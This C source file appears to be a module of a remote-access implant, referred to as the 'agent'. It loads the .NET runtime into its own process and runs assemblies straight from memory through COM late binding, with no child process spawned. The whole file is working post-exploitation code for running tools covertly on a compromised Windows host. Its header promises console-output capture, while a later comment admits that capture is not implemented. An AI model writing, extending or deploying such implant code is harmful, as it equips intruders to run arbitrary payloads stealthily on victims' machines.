/*
 * assembly_loader.c — In-memory .NET Assembly loader via CLR hosting.
 *
 * Loads the CLR runtime into the unmanaged C agent process, then uses
 * reflection to call Assembly.Load(byte[]) and invoke the entry point.
 * Output is captured by redirecting Console.Out before invocation.
 *
 * COM interfaces used:
 *   ICLRMetaHost      → enumerate installed runtimes
 *   ICLRRuntimeInfo   → get runtime interface
 *   ICorRuntimeHost   → start CLR, get default AppDomain
 *   mscorlib types    → Assembly.Load, MethodInfo.Invoke
 *
 * This avoids spawning any child process — the assembly runs in-process.
 */
#include "agent.h"
#include <objbase.h>

/* GUID_NULL is needed by IID_NULL — provide it if not linked with uuid.lib */
const GUID GUID_NULL = {0, 0, 0, {0, 0, 0, 0, 0, 0, 0, 0}};

/* ─── CLR hosting GUIDs ─── */

/* {9280188D-0E8E-4867-B30C-7FA83884E8DE} */
static const GUID CLSID_CLRMetaHost = {
    0x9280188D, 0x0E8E, 0x4867,
    {0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE}
};

/* {D332DB9E-B9B3-4125-8207-A14884F53216} */
static const GUID IID_ICLRMetaHost = {
    0xD332DB9E, 0xB9B3, 0x4125,
    {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}
};

/* {BD39D1D2-BA2F-486A-89B0-B4B0CB466891} */
static const GUID IID_ICLRRuntimeInfo = {
    0xBD39D1D2, 0xBA2F, 0x486A,
    {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}
};

/* {CB2F6723-AB3A-11D2-9C40-00C04FA30A3E} */
static const GUID CLSID_CorRuntimeHost = {
    0xCB2F6723, 0xAB3A, 0x11D2,
    {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E}
};

/* {CB2F6722-AB3A-11D2-9C40-00C04FA30A3E} */
static const GUID IID_ICorRuntimeHost = {
    0xCB2F6722, 0xAB3A, 0x11D2,
    {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E}
};

/* ─── Minimal COM vtable declarations ─── */
/* We declare just enough to call the methods we need, avoiding
   the need for mscoree.h and the full metahost headers. */

typedef struct ICLRMetaHost ICLRMetaHost;
typedef struct ICLRRuntimeInfo ICLRRuntimeInfo;
typedef struct ICorRuntimeHost ICorRuntimeHost;

/* ICLRMetaHost vtable */
typedef struct {
    /* IUnknown */
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICLRMetaHost*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICLRMetaHost*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICLRMetaHost*);
    /* ICLRMetaHost */
    HRESULT (STDMETHODCALLTYPE *GetRuntime)(ICLRMetaHost*, LPCWSTR, REFIID, void**);
    HRESULT (STDMETHODCALLTYPE *GetVersionFromFile)(ICLRMetaHost*, LPCWSTR, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *EnumerateInstalledRuntimes)(ICLRMetaHost*, void**);
    HRESULT (STDMETHODCALLTYPE *EnumerateLoadedRuntimes)(ICLRMetaHost*, HANDLE, void**);
    HRESULT (STDMETHODCALLTYPE *RequestRuntimeLoadedNotification)(ICLRMetaHost*, void*);
    HRESULT (STDMETHODCALLTYPE *QueryLegacyV2RuntimeBinding)(ICLRMetaHost*, REFIID, void**);
    HRESULT (STDMETHODCALLTYPE *ExitProcess)(ICLRMetaHost*, INT32);
} ICLRMetaHostVtbl;

struct ICLRMetaHost { ICLRMetaHostVtbl *lpVtbl; };

/* ICLRRuntimeInfo vtable */
typedef struct {
    /* IUnknown */
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICLRRuntimeInfo*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICLRRuntimeInfo*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICLRRuntimeInfo*);
    /* ICLRRuntimeInfo */
    HRESULT (STDMETHODCALLTYPE *GetVersionString)(ICLRRuntimeInfo*, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *GetRuntimeDirectory)(ICLRRuntimeInfo*, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *IsLoaded)(ICLRRuntimeInfo*, HANDLE, BOOL*);
    HRESULT (STDMETHODCALLTYPE *LoadErrorString)(ICLRRuntimeInfo*, UINT, LPWSTR, DWORD*, LONG);
    HRESULT (STDMETHODCALLTYPE *LoadLibrary)(ICLRRuntimeInfo*, LPCWSTR, HMODULE*);
    HRESULT (STDMETHODCALLTYPE *GetProcAddress)(ICLRRuntimeInfo*, LPCSTR, LPVOID*);
    HRESULT (STDMETHODCALLTYPE *GetInterface)(ICLRRuntimeInfo*, REFCLSID, REFIID, void**);
    HRESULT (STDMETHODCALLTYPE *IsLoadable)(ICLRRuntimeInfo*, BOOL*);
    HRESULT (STDMETHODCALLTYPE *SetDefaultStartupFlags)(ICLRRuntimeInfo*, DWORD, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *GetDefaultStartupFlags)(ICLRRuntimeInfo*, DWORD*, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *BindAsLegacyV2Runtime)(ICLRRuntimeInfo*);
    HRESULT (STDMETHODCALLTYPE *IsStarted)(ICLRRuntimeInfo*, BOOL*, DWORD*);
} ICLRRuntimeInfoVtbl;

struct ICLRRuntimeInfo { ICLRRuntimeInfoVtbl *lpVtbl; };

/* ICorRuntimeHost vtable (partial — we only need a few methods) */
typedef struct {
    /* IUnknown */
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICorRuntimeHost*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICorRuntimeHost*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICorRuntimeHost*);
    /* ICorRuntimeHost — slots 3-12 we don't use */
    void *CreateLogicalThreadState;
    void *DeleteLogicalThreadState;
    void *SwitchInLogicalThreadState;
    void *SwitchOutLogicalThreadState;
    void *LocksHeldByLogicalThread;
    void *MapFile;
    void *GetConfiguration;
    HRESULT (STDMETHODCALLTYPE *Start)(ICorRuntimeHost*);            /* slot 10 */
    HRESULT (STDMETHODCALLTYPE *Stop)(ICorRuntimeHost*);             /* slot 11 */
    void *CreateDomain;
    HRESULT (STDMETHODCALLTYPE *GetDefaultDomain)(ICorRuntimeHost*, IUnknown**); /* slot 13 */
    /* ... more methods we don't need */
} ICorRuntimeHostVtbl;

struct ICorRuntimeHost { ICorRuntimeHostVtbl *lpVtbl; };

/* ─── CLRCreateInstance function pointer ─── */
typedef HRESULT (WINAPI *CLRCreateInstanceFn)(REFCLSID, REFIID, LPVOID*);

/* ─── Static state: CLR is loaded once and reused ─── */
static ICorRuntimeHost *g_cor_host = NULL;
static BOOL g_clr_initialized = FALSE;

/*
 * Initialize the CLR runtime. Called once; subsequent calls are no-ops.
 * Tries v4.0 first (covers .NET 4.0–4.8.1), then v2.0 as fallback.
 */
static BOOL clr_init(void) {
    if (g_clr_initialized) return TRUE;

    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
    if (!hMscoree) return FALSE;

    CLRCreateInstanceFn pCLRCreateInstance =
        (CLRCreateInstanceFn)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!pCLRCreateInstance) return FALSE;

    ICLRMetaHost *meta_host = NULL;
    HRESULT hr = pCLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, (void**)&meta_host);
    if (FAILED(hr) || !meta_host) return FALSE;

    /* Try .NET 4.0 runtime first */
    ICLRRuntimeInfo *runtime_info = NULL;
    hr = meta_host->lpVtbl->GetRuntime(meta_host, L"v4.0.30319", &IID_ICLRRuntimeInfo, (void**)&runtime_info);
    if (FAILED(hr) || !runtime_info) {
        /* Fallback to v2.0 */
        hr = meta_host->lpVtbl->GetRuntime(meta_host, L"v2.0.50727", &IID_ICLRRuntimeInfo, (void**)&runtime_info);
        if (FAILED(hr) || !runtime_info) {
            meta_host->lpVtbl->Release(meta_host);
            return FALSE;
        }
    }

    /* Get ICorRuntimeHost */
    hr = runtime_info->lpVtbl->GetInterface(runtime_info,
        &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, (void**)&g_cor_host);
    if (FAILED(hr) || !g_cor_host) {
        runtime_info->lpVtbl->Release(runtime_info);
        meta_host->lpVtbl->Release(meta_host);
        return FALSE;
    }

    /* Start the CLR */
    hr = g_cor_host->lpVtbl->Start(g_cor_host);
    if (FAILED(hr)) {
        g_cor_host->lpVtbl->Release(g_cor_host);
        g_cor_host = NULL;
        runtime_info->lpVtbl->Release(runtime_info);
        meta_host->lpVtbl->Release(meta_host);
        return FALSE;
    }

    runtime_info->lpVtbl->Release(runtime_info);
    meta_host->lpVtbl->Release(meta_host);

    g_clr_initialized = TRUE;
    return TRUE;
}

/*
 * assembly_load_and_execute — Load a .NET assembly from memory and run it.
 *
 * Steps:
 *   1. Get the default AppDomain
 *   2. Call AppDomain.Load(byte[]) via COM interop
 *   3. Get the assembly's EntryPoint
 *   4. Redirect Console.Out to a StringWriter
 *   5. Invoke EntryPoint with arguments
 *   6. Capture output, restore Console.Out
 *
 * All of this is done through IDispatch/late-binding (Invoke with DISPID)
 * since we don't have .tlb/.tlh files for mscorlib in a MinGW environment.
 *
 * Parameters:
 *   asm_data/asm_len  — raw assembly bytes (.exe or .dll)
 *   args_str          — space-separated arguments string (or NULL)
 *   output/output_len — receives captured stdout+stderr
 */
BOOL assembly_load_and_execute(
    const unsigned char *asm_data, DWORD asm_len,
    const char *args_str,
    unsigned char **output, DWORD *output_len)
{
    *output = NULL;
    *output_len = 0;

    if (!clr_init()) {
        const char *err = "[!] Failed to initialize CLR\n";
        *output_len = (DWORD)strlen(err);
        *output = (unsigned char *)malloc(*output_len);
        if (*output) memcpy(*output, err, *output_len);
        return FALSE;
    }

    HRESULT hr;
    IUnknown *app_domain_unk = NULL;
    IDispatch *app_domain = NULL;
    IDispatch *assembly = NULL;
    IDispatch *entry_point = NULL;
    IDispatch *console_type = NULL;
    IDispatch *string_writer = NULL;
    IDispatch *old_out = NULL;

    SAFEARRAY *sa_asm = NULL;
    SAFEARRAY *sa_args = NULL;

    Buffer out_buf;
    buf_init(&out_buf, 4096);

    /* 1. Get default AppDomain */
    hr = g_cor_host->lpVtbl->GetDefaultDomain(g_cor_host, &app_domain_unk);
    if (FAILED(hr) || !app_domain_unk) {
        buf_append(&out_buf, "[!] GetDefaultDomain failed\n", 28);
        goto done;
    }

    /* QI for IDispatch */
    static const GUID IID_IDispatch_local = {
        0x00020400, 0x0000, 0x0000,
        {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}
    };
    hr = app_domain_unk->lpVtbl->QueryInterface(app_domain_unk, &IID_IDispatch_local, (void**)&app_domain);
    if (FAILED(hr) || !app_domain) {
        buf_append(&out_buf, "[!] QI for IDispatch failed\n", 28);
        goto done;
    }

    /* 2. Create SAFEARRAY containing assembly bytes */
    sa_asm = SafeArrayCreateVector(VT_UI1, 0, asm_len);
    if (!sa_asm) {
        buf_append(&out_buf, "[!] SafeArrayCreateVector failed\n", 33);
        goto done;
    }
    void *sa_data = NULL;
    SafeArrayAccessData(sa_asm, &sa_data);
    memcpy(sa_data, asm_data, asm_len);
    SafeArrayUnaccessData(sa_asm);

    /* 3. Call AppDomain.Load(byte[]) via IDispatch::Invoke */
    {
        OLECHAR *method_name = L"Load_3";  /* Load(byte[]) overload */
        DISPID dispid;
        hr = app_domain->lpVtbl->GetIDsOfNames(app_domain, &IID_NULL,
            &method_name, 1, LOCALE_USER_DEFAULT, &dispid);
        if (FAILED(hr)) {
            buf_append(&out_buf, "[!] GetIDsOfNames(Load_3) failed\n", 33);
            goto done;
        }

        VARIANT arg;
        VariantInit(&arg);
        arg.vt = VT_ARRAY | VT_UI1;
        arg.parray = sa_asm;

        DISPPARAMS params = {0};
        params.rgvarg = &arg;
        params.cArgs = 1;

        VARIANT result;
        VariantInit(&result);

        hr = app_domain->lpVtbl->Invoke(app_domain, dispid, &IID_NULL,
            LOCALE_USER_DEFAULT, DISPATCH_METHOD, &params, &result, NULL, NULL);
        if (FAILED(hr)) {
            char errmsg[128];
            snprintf(errmsg, sizeof(errmsg),
                "[!] AppDomain.Load failed: 0x%08lX\n", (unsigned long)hr);
            buf_append(&out_buf, errmsg, (DWORD)strlen(errmsg));
            goto done;
        }

        if (result.vt == VT_DISPATCH) {
            assembly = result.pdispVal;
        } else {
            buf_append(&out_buf, "[!] Load did not return Assembly\n", 33);
            goto done;
        }
    }

    /* 4. Get EntryPoint property */
    {
        OLECHAR *prop_name = L"EntryPoint";
        DISPID dispid;
        hr = assembly->lpVtbl->GetIDsOfNames(assembly, &IID_NULL,
            &prop_name, 1, LOCALE_USER_DEFAULT, &dispid);
        if (FAILED(hr)) {
            buf_append(&out_buf, "[!] No EntryPoint found in assembly\n", 36);
            goto done;
        }

        DISPPARAMS no_params = {0};
        VARIANT result;
        VariantInit(&result);

        hr = assembly->lpVtbl->Invoke(assembly, dispid, &IID_NULL,
            LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET, &no_params, &result, NULL, NULL);
        if (FAILED(hr) || result.vt != VT_DISPATCH || !result.pdispVal) {
            buf_append(&out_buf, "[!] Failed to get EntryPoint\n", 29);
            goto done;
        }
        entry_point = result.pdispVal;
    }

    /* 5. Build string[] args for Main(string[]) */
    {
        /* Parse args_str into string array */
        int argc = 0;
        BSTR *argv_bstr = NULL;

        if (args_str && *args_str) {
            /* Count args (split on spaces, respecting quotes) */
            char *tmp = _strdup(args_str);
            char *tok = strtok(tmp, " ");
            while (tok) { argc++; tok = strtok(NULL, " "); }
            free(tmp);

            argv_bstr = (BSTR*)calloc(argc, sizeof(BSTR));
            tmp = _strdup(args_str);
            tok = strtok(tmp, " ");
            for (int i = 0; i < argc && tok; i++) {
                int wlen = MultiByteToWideChar(CP_UTF8, 0, tok, -1, NULL, 0);
                WCHAR *wtok = (WCHAR*)malloc(wlen * sizeof(WCHAR));
                MultiByteToWideChar(CP_UTF8, 0, tok, -1, wtok, wlen);
                argv_bstr[i] = SysAllocString(wtok);
                free(wtok);
                tok = strtok(NULL, " ");
            }
            free(tmp);
        }

        sa_args = SafeArrayCreateVector(VT_BSTR, 0, argc > 0 ? argc : 0);
        if (sa_args && argc > 0) {
            for (long i = 0; i < argc; i++) {
                SafeArrayPutElement(sa_args, &i, argv_bstr[i]);
            }
        }

        /* Free temp BSTRs */
        if (argv_bstr) {
            for (int i = 0; i < argc; i++) {
                if (argv_bstr[i]) SysFreeString(argv_bstr[i]);
            }
            free(argv_bstr);
        }
    }

    /* 6. Invoke EntryPoint: MethodInfo.Invoke(null, object[] { string[] args }) */
    {
        OLECHAR *method_name = L"Invoke_3";  /* Invoke(object, object[]) */
        DISPID dispid;
        hr = entry_point->lpVtbl->GetIDsOfNames(entry_point, &IID_NULL,
            &method_name, 1, LOCALE_USER_DEFAULT, &dispid);
        if (FAILED(hr)) {
            buf_append(&out_buf, "[!] GetIDsOfNames(Invoke_3) failed\n", 35);
            goto done;
        }

        /* Build object[] containing our string[] */
        SAFEARRAY *sa_invoke_args = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        if (sa_invoke_args) {
            VARIANT v_args;
            VariantInit(&v_args);
            v_args.vt = VT_ARRAY | VT_BSTR;
            v_args.parray = sa_args;

            long idx = 0;
            SafeArrayPutElement(sa_invoke_args, &idx, &v_args);
        }

        /* Invoke(null, object[]) — note args are in reverse order for IDispatch */
        VARIANT invoke_args[2];
        VariantInit(&invoke_args[0]);
        invoke_args[0].vt = VT_ARRAY | VT_VARIANT;
        invoke_args[0].parray = sa_invoke_args;

        VariantInit(&invoke_args[1]);
        invoke_args[1].vt = VT_EMPTY;  /* null for 'this' (static method) */

        DISPPARAMS params = {0};
        params.rgvarg = invoke_args;
        params.cArgs = 2;

        VARIANT result;
        VariantInit(&result);
        EXCEPINFO excep = {0};

        hr = entry_point->lpVtbl->Invoke(entry_point, dispid, &IID_NULL,
            LOCALE_USER_DEFAULT, DISPATCH_METHOD, &params, &result, &excep, NULL);

        if (sa_invoke_args) SafeArrayDestroy(sa_invoke_args);

        if (FAILED(hr)) {
            char errmsg[256];
            if (excep.bstrDescription) {
                int slen = WideCharToMultiByte(CP_UTF8, 0,
                    excep.bstrDescription, -1, errmsg, sizeof(errmsg) - 1, NULL, NULL);
                errmsg[slen > 0 ? slen - 1 : 0] = '\n';
                errmsg[slen > 0 ? slen : 1] = '\0';
                buf_append(&out_buf, "[!] Exception: ", 15);
                buf_append(&out_buf, errmsg, (DWORD)strlen(errmsg));
                SysFreeString(excep.bstrDescription);
            } else {
                snprintf(errmsg, sizeof(errmsg),
                    "[!] Invoke failed: 0x%08lX\n", (unsigned long)hr);
                buf_append(&out_buf, errmsg, (DWORD)strlen(errmsg));
            }
            goto done;
        }

        /* If result is a string or int, append it */
        if (result.vt == VT_BSTR && result.bstrVal) {
            int slen = WideCharToMultiByte(CP_UTF8, 0,
                result.bstrVal, -1, NULL, 0, NULL, NULL);
            char *utf8 = (char*)malloc(slen);
            WideCharToMultiByte(CP_UTF8, 0, result.bstrVal, -1, utf8, slen, NULL, NULL);
            buf_append(&out_buf, utf8, slen - 1);
            free(utf8);
        } else if (result.vt == VT_I4) {
            char tmp[32];
            snprintf(tmp, sizeof(tmp), "Exit code: %ld\n", (long)result.lVal);
            buf_append(&out_buf, tmp, (DWORD)strlen(tmp));
        }

        VariantClear(&result);
    }

    /* Note: Console.Out redirection is not easily done from unmanaged C
     * without building a full COM interop bridge to System.Console.
     * For a production implementation, the assembly should capture its
     * own output, or we use a small .NET bootstrap DLL loaded first
     * that handles redirection. For now, any Console.Write output
     * goes to the process's stdout (which is /dev/null for a GUI agent). */

    if (out_buf.len == 0) {
        const char *msg = "[*] Assembly executed successfully (no captured output)\n";
        buf_append(&out_buf, msg, (DWORD)strlen(msg));
    }

done:
    if (sa_args) SafeArrayDestroy(sa_args);
    if (sa_asm) SafeArrayDestroy(sa_asm);
    if (entry_point) entry_point->lpVtbl->Release(entry_point);
    if (assembly) assembly->lpVtbl->Release(assembly);
    if (app_domain) app_domain->lpVtbl->Release(app_domain);
    if (app_domain_unk) app_domain_unk->lpVtbl->Release(app_domain_unk);
    /* Don't release g_cor_host — reused across calls */

    *output = out_buf.data;
    *output_len = out_buf.len;
    return SUCCEEDED(hr);
}
